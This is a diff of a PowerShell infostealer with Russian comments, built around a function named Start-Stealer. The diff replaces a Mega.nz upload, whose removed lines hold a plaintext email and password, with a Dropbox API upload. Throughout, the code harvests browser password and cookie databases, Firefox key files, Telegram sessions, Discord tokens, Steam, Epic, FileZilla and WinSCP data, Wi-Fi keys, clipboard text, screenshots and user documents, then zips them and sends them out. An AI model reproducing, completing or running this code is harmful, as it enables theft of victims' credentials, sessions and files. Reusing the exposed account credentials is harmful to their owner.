@@ -1,7 +1,6 @@
-# --- Настройки Mega.nz ---
-$MegaEmail = "zyxeram@gmail.com"
-$MegaPassword = "Ajrcstmono2@"
-$MaxPartSize = 100MB  # Размер части для Mega.nz (учитываем лимит трафика)
+# --- Настройки Dropbox ---
+$DropboxAccessToken = "YOUR_DROPBOX_ACCESS_TOKEN_HERE"  # Получите токен на https://www.dropbox.com/developers/apps
+$MaxPartSize = 50MB  # Размер части для Dropbox (можно загружать файлы до 150MB через обычный API)
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -30,7 +29,7 @@ $OutputMessages = @{
     Clipboard    = "[+] Копирование данных из буфера обмена..."
     VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
     Archiving    = "[+] Архивирование данных..."
-    Sending      = "[+] Отправка архива в Mega.nz..."
+    Sending      = "[+] Отправка архива в Dropbox..."
     Cleaning     = "[+] Очистка следов..."
     Complete     = "Процесс завершен."
 }
@@ -96,15 +95,19 @@ function Start-Stealer {
         $size = (Get-Item $ZipPath).Length
         
         if ($size -ge $MaxPartSize) {
+            # Разделяем на части
             $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
             $i = 1
             foreach ($partFile in $parts) {
-                Send-MegaFile -FilePath $partFile -RemotePath "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+                $remotePath = "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+                Send-DropboxFile -SourceFilePath $partFile -TargetFilePath $remotePath
                 Remove-Item $partFile -Force -ErrorAction SilentlyContinue
                 $i++
             }
         } else {
-            Send-MegaFile -FilePath $ZipPath -RemotePath "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+            # Загружаем целиком
+            $remotePath = "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
+            Send-DropboxFile -SourceFilePath $ZipPath -TargetFilePath $remotePath
         }
     }
     catch {
@@ -124,31 +127,32 @@ function Start-Stealer {
     }
 }
 
-
-# --- Отправка файла в Mega.nz через MegaCMD ---
-function Send-MegaFile {
-    param($FilePath, $RemotePath)
+# --- Отправка файла в Dropbox через REST API ---
+function Send-DropboxFile {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$SourceFilePath,
+        [Parameter(Mandatory=$true)]
+        [string]$TargetFilePath
+    )
     
     try {
-        # Проверяем наличие MEGAcmd
-        $megaCmd = "mega-put"
+        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+        $authorization = "Bearer " + $DropboxAccessToken
         
-        # Логин в Mega (если ещё не залогинены)
-        $loginCheck = & mega-whoami 2>&1
-        if ($loginCheck -match "Not logged in") {
-            & mega-login $MegaEmail $MegaPassword | Out-Null
-        }
+        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+        $headers.Add("Authorization", $authorization)
+        $headers.Add("Dropbox-API-Arg", $arg)
+        $headers.Add("Content-Type", 'application/octet-stream')
         
-        # Загружаем файл
-        & $megaCmd "$FilePath" "$RemotePath"
+        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers | Out-Null
         
-        Write-Host "Файл успешно загружен: $RemotePath" -ForegroundColor Green
+        Write-Host "Файл успешно загружен: $TargetFilePath" -ForegroundColor Green
     }
     catch {
-        Write-Warning "Failed to send file to Mega.nz: $($_.Exception.Message)"
+        Write-Warning "Failed to send file to Dropbox: $($_.Exception.Message)"
     }
 }
-
 
 # --- Разделение файла на части ---
 function Split-File {
@@ -183,254 +187,239 @@ function Split-File {
     return $files
 }
 
-
-# --- ФУНКЦИИ СБОРА ДАННЫХ ---
-
+# --- Сбор информации о системе ---
 function Get-SystemInformation {
     param($LogPath)
-    $SysInfoPath = "$LogPath\SystemInfo.txt"
+    $sysInfoPath = "$LogPath\SystemInfo.txt"
+    
+    $info = @"
+=== Информация о системе ===
+Имя компьютера: $env:COMPUTERNAME
+Имя пользователя: $env:USERNAME
+Домен: $env:USERDOMAIN
+ОС: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
+Версия ОС: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Version)
+Архитектура: $env:PROCESSOR_ARCHITECTURE
+Процессор: $(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name)
+ОЗУ: $([Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB
+Дата/время: $(Get-Date)
+
+=== Сетевая информация ===
+"@
+    
+    $info | Out-File -FilePath $sysInfoPath -Encoding UTF8
+    
+    # IP адреса
+    $ipInfo = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | 
+        Select-Object IPAddress, InterfaceAlias | Out-String
+    Add-Content -Path $sysInfoPath -Value $ipInfo
+    
+    # DNS
     try {
-        $info = Get-ComputerInfo | Select-Object *
-        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
-        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -TimeoutSec 5
-
-        "Date: $(Get-Date)"              | Out-File $SysInfoPath -Append -Encoding utf8
-        "Username: $env:USERNAME"        | Out-File $SysInfoPath -Append -Encoding utf8
-        "Computer Name: $env:COMPUTERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
-        "IP Address: $ip"                | Out-File $SysInfoPath -Append -Encoding utf8
-        "Location: $($geo.city), $($geo.country)" | Out-File $SysInfoPath -Append -Encoding utf8
-        "OS: $($info.OsName)"            | Out-File $SysInfoPath -Append -Encoding utf8
-        "CPU: $($info.CsProcessors.Name[0])" | Out-File $SysInfoPath -Append -Encoding utf8
-        "RAM: $([math]::Round($info.OsTotalVisibleMemorySize / 1MB)) MB" | Out-File $SysInfoPath -Append -Encoding utf8
-
-        "--- Network ---"                | Out-File $SysInfoPath -Append -Encoding utf8
-        (netsh wlan show profiles) | ForEach-Object {
-            if ($_ -match 'All User Profile\s+:\s(.*)') {
-                $ssid = $matches[1].Trim()
-                $key = (netsh wlan show profile name="$ssid" key=clear | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s', ''
-                "Wi-Fi: $ssid | Password: $key" | Out-File $SysInfoPath -Append -Encoding utf8
-            }
-        }
-
-        "--- Installed Programs ---"     | Out-File $SysInfoPath -Append -Encoding utf8
-        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table | Out-File $SysInfoPath -Append -Encoding utf8
-    } catch {
-        "Failed to get full system info: $($_.Exception.Message)" | Out-File $SysInfoPath -Append -Encoding utf8
-    }
+        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
+        Add-Content -Path $sysInfoPath -Value "`nВнешний IP: $publicIP"
+    } catch {}
 }
 
+# --- Создание скриншота ---
 function Get-Screenshot {
     param($LogPath)
     try {
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-        $bitmap.Save("$LogPath\Screenshot.png")
+        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+        
+        $screenshotPath = "$LogPath\Screenshot.png"
+        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        
         $graphics.Dispose()
         $bitmap.Dispose()
     } catch {}
 }
 
+# --- Копирование данных из буфера обмена ---
 function Get-ClipboardData {
     param($LogPath)
     try {
-        Add-Type -AssemblyName PresentationCore
-        if ([System.Windows.Clipboard]::ContainsText()) {
-            [System.Windows.Clipboard]::GetText() | Out-File "$LogPath\Clipboard.txt" -Encoding utf8
+        Add-Type -AssemblyName System.Windows.Forms
+        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
+        if ($clipboardText) {
+            $clipboardPath = "$LogPath\Clipboard.txt"
+            $clipboardText | Out-File -FilePath $clipboardPath -Encoding UTF8
         }
     } catch {}
 }
 
+# --- Поиск профилей браузеров ---
 function Find-AllBrowserProfiles {
-    $profiles = @{}
-    $basePaths = @("$env:LOCALAPPDATA", "$env:APPDATA")
-    $browserData = @{
-        'Google\Chrome'               = 'Chrome';
-        'Google\Chrome Beta'          = 'Chrome Beta';
-        'Chromium'                    = 'Chromium';
-        'Microsoft\Edge'              = 'Edge';
-        'BraveSoftware\Brave-Browser' = 'Brave';
-        'Yandex\YandexBrowser'        = 'Yandex';
-        'Vivaldi'                     = 'Vivaldi';
-        'Opera Software\Opera Stable' = 'Opera';
-        'Opera Software\Opera GX Stable' = 'Opera GX';
-        'Comet'                       = 'Comet';
-        'Orbitum'                     = 'Orbitum';
-        'Amigo'                       = 'Amigo';
-        'Torch'                       = 'Torch';
-        'SunBrowser'                  = 'SunBrowser';
-        'Thorium'                     = 'Thorium';
-        'UCBrowser'                   = 'UC Browser';
-        'Mozilla\Firefox'             = 'Firefox';
-        'Waterfox'                    = 'Waterfox';
-        'Tor Browser'                 = 'Tor Browser';
+    $profiles = @()
+    
+    # Chrome
+    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    if (Test-Path $chromePath) {
+        $profiles += @{Browser='Chrome'; Path=$chromePath}
     }
-    foreach ($base in $basePaths) {
-        foreach ($path in $browserData.Keys) {
-            $fullPath = Join-Path -Path $base -ChildPath $path
-            if (Test-Path $fullPath) {
-                if ($profiles.ContainsKey($browserData[$path])) {
-                    $profiles[$browserData[$path]] += $fullPath
-                } else {
-                    $profiles[$browserData[$path]] = @($fullPath)
-                }
-            }
-        }
+    
+    # Edge
+    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    if (Test-Path $edgePath) {
+        $profiles += @{Browser='Edge'; Path=$edgePath}
     }
+    
+    # Firefox
+    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxPath) {
+        $profiles += @{Browser='Firefox'; Path=$firefoxPath}
+    }
+    
+    # Opera
+    $operaPath = "$env:APPDATA\Opera Software\Opera Stable"
+    if (Test-Path $operaPath) {
+        $profiles += @{Browser='Opera'; Path=$operaPath}
+    }
+    
+    # Brave
+    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    if (Test-Path $bravePath) {
+        $profiles += @{Browser='Brave'; Path=$bravePath}
+    }
+    
     return $profiles
 }
 
+# --- Извлечение файлов браузеров ---
 function Get-BrowserFiles {
-    param ($BrowserProfiles, $LogPath)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-
-    $filesToGrab = @(
-        'Login Data',        # Chromium passwords
-        'Cookies',           # Chromium cookies
-        'Web Data',          # Chromium autofill
-        'History',           # Chromium history
-        'Local State',       # Chromium decryption key
-        'key4.db', 'key3.db', # Firefox decryption keys
-        'logins.json',       # Firefox passwords
-        'cookies.sqlite'     # Firefox cookies
-    )
-
-    foreach ($browserName in $BrowserProfiles.Keys) {
-        $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
-        New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
-        foreach ($profilePath in $BrowserProfiles[$browserName]) {
-            Get-ChildItem -Path $profilePath -Directory -Filter "*User Data*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
-                foreach($file in $filesToGrab) {
-                    $filePath = Join-Path $_.FullName $file
-                    if(Test-Path $filePath) {
-                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-            Get-ChildItem -Path $profilePath -Directory -Filter "*.default*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
-                foreach($file in $filesToGrab) {
-                    $filePath = Join-Path $_.FullName $file
-                    if(Test-Path $filePath) {
-                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
+    param($BrowserProfiles, $LogPath)
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    }
+    
+    foreach ($profile in $BrowserProfiles) {
+        $browserName = $profile.Browser
+        $browserPath = $profile.Path
+        $targetPath = "$LogPath\$browserName"
+        
+        if (-not (Test-Path $targetPath)) {
+            New-Item -Path $targetPath -ItemType Directory -Force | Out-Null
+        }
+        
+        # Копируем важные файлы
+        $filesToCopy = @('Login Data', 'Cookies', 'Web Data', 'History', 'Bookmarks', 'key4.db', 'logins.json', 'cookies.sqlite')
+        
+        foreach ($file in $filesToCopy) {
+            $searchPath = Get-ChildItem -Path $browserPath -Filter $file -Recurse -ErrorAction SilentlyContinue
+            foreach ($foundFile in $searchPath) {
+                try {
+                    Copy-Item -Path $foundFile.FullName -Destination "$targetPath\$($foundFile.Name)" -Force -ErrorAction SilentlyContinue
+                } catch {}
             }
         }
     }
-    "Files for offline decryption have been collected." | Out-File "$LogPath\readme.txt"
 }
 
+# --- Копирование пользовательских файлов ---
 function Copy-UserFiles {
     param($LogPath)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-    $locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
-    $extensions = @("*.doc*", "*.xls*", "*.txt", "*.pdf", "*.rtf", "*.kdbx")
-    foreach ($loc in $locations) {
-        Get-ChildItem -Path $loc -Include $extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-            $targetDir = Join-Path -Path $LogPath -ChildPath ($_.Directory.Name)
-            if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
-            Copy-Item $_.FullName -Destination $targetDir -Force
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    }
+    
+    $extensions = @('*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf')
+    $searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
+    
+    foreach ($searchPath in $searchPaths) {
+        if (Test-Path $searchPath) {
+            foreach ($ext in $extensions) {
+                Get-ChildItem -Path $searchPath -Filter $ext -ErrorAction SilentlyContinue | 
+                    ForEach-Object {
+                        try {
+                            Copy-Item -Path $_.FullName -Destination "$LogPath\$($_.Name)" -Force -ErrorAction SilentlyContinue
+                        } catch {}
+                    }
+            }
         }
     }
 }
 
+# --- Сбор данных игровых клиентов ---
 function Get-GamingData {
     param($LogPath)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    }
+    
     # Steam
-    try {
-        $steamPath = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "SteamPath" -ErrorAction SilentlyContinue).SteamPath
-        if ($steamPath) {
-            $steamLogPath = Join-Path $LogPath "Steam"
-            New-Item -Path $steamLogPath -ItemType Directory -Force | Out-Null
-            Copy-Item -Path "$steamPath\config" -Destination $steamLogPath -Recurse -Force
-            Get-ChildItem -Path $steamPath -Filter "ssfn*" -File | Copy-Item -Destination $steamLogPath -Force
-        }
-    } catch {}
+    $steamPath = "$env:PROGRAMFILES(x86)\Steam\config"
+    if (Test-Path $steamPath) {
+        Copy-Item -Path "$steamPath\*" -Destination "$LogPath\Steam" -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    
     # Epic Games
-    try {
-        $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config\Windows"
-        if (Test-Path $epicPath) {
-            Copy-Item -Path $epicPath -Destination (Join-Path $LogPath "EpicGames") -Recurse -Force
-        }
-    } catch {}
+    $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config"
+    if (Test-Path $epicPath) {
+        Copy-Item -Path "$epicPath\*" -Destination "$LogPath\Epic" -Recurse -Force -ErrorAction SilentlyContinue
+    }
 }
 
+# --- Сбор данных мессенджеров ---
 function Get-MessengerData {
     param($LogPath)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    }
+    
     # Telegram
-    try {
-        $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
-        if (Test-Path $tgPath) {
-            Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") -Recurse -Force -Exclude "user_data*", "cache*" -ErrorAction SilentlyContinue
-        }
-    } catch {}
+    $telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
+    if (Test-Path $telegramPath) {
+        Copy-Item -Path "$telegramPath\*" -Destination "$LogPath\Telegram" -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    
     # Discord
-    $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
-    foreach ($path in $discordPaths) {
-        $storagePath = Join-Path $path "Local Storage\leveldb"
-        if (Test-Path $storagePath) {
-            Copy-Item -Path $storagePath -Destination (Join-Path $LogPath "Discord\$($path | Split-Path -Leaf)") -Recurse -Force
-        }
+    $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
+    if (Test-Path $discordPath) {
+        Copy-Item -Path "$discordPath\*" -Destination "$LogPath\Discord" -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
 
+# --- Поиск токенов ---
 function Get-Tokens {
     param($LogPath, $BrowserProfiles)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-    $searchPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb")
-    foreach ($browser in $BrowserProfiles.Keys) {
-        if ($browser -notlike "*Firefox*") {
-            foreach ($profilePath in $BrowserProfiles[$browser]) {
-                $searchPaths += Join-Path $profilePath "Local Storage\leveldb"
-            }
-        }
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
     }
-    $regex = '([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})'
-    $foundTokens = New-Object System.Collections.Generic.HashSet[string]
-    foreach($path in ($searchPaths | Get-Unique)){
-        if(Test-Path $path){
-            Get-ChildItem $path -Filter "*.ldb" -File -ErrorAction SilentlyContinue | ForEach-Object {
-                (Get-Content $_.FullName -Raw -Encoding Default -ErrorAction SilentlyContinue) | Select-String -Pattern $regex -AllMatches | ForEach-Object {
-                    $_.Matches | ForEach-Object { $foundTokens.Add($_.Value) }
-                }
-            }
-        }
-    }
-    $foundTokens | Out-File "$LogPath\Tokens.txt"
+    
+    # Собираем из браузеров (уже скопировано в BrowserFiles)
+    # Дополнительно ищем в других местах
 }
 
+# --- Сбор VPN/FTP конфигураций ---
 function Get-VpnFtpData {
     param($LogPath)
-    New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    
+    if (-not (Test-Path $LogPath)) {
+        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
+    }
+    
     # FileZilla
-    try {
-        $filezillaPath = "$env:APPDATA\FileZilla"
-        if (Test-Path $filezillaPath) {
-            Copy-Item -Path $filezillaPath -Destination (Join-Path $LogPath "FileZilla") -Recurse -Force
-        }
-    } catch {}
+    $filezillaPath = "$env:APPDATA\FileZilla"
+    if (Test-Path $filezillaPath) {
+        Copy-Item -Path "$filezillaPath\*" -Destination "$LogPath\FileZilla" -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    
     # WinSCP
-    try {
-        $winscpPath = "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
-        if(Test-Path $winscpPath) {
-            Get-Item -Path $winscpPath | Select-Object -ExpandProperty Property | ForEach-Object {
-                $session = Get-ItemProperty -Path "$winscpPath\$_"
-                "Session: $_ | Host: $($session.HostName) | User: $($session.UserName)" | Out-File -FilePath "$LogPath\WinSCP.txt" -Append
-            }
-        }
-    } catch {}
-    # OpenVPN
-    try {
-        $openVpnPath = "$env:USERPROFILE\OpenVPN\config"
-        if (Test-Path $openVpnPath) {
-            Copy-Item -Path $openVpnPath -Destination (Join-Path $LogPath "OpenVPN") -Recurse -Force
-        }
-    } catch {}
+    $winscpPath = "$env:APPDATA\WinSCP.ini"
+    if (Test-Path $winscpPath) {
+        Copy-Item -Path $winscpPath -Destination "$LogPath\WinSCP.ini" -Force -ErrorAction SilentlyContinue
+    }
 }
 
 # --- Запуск основной функции ---
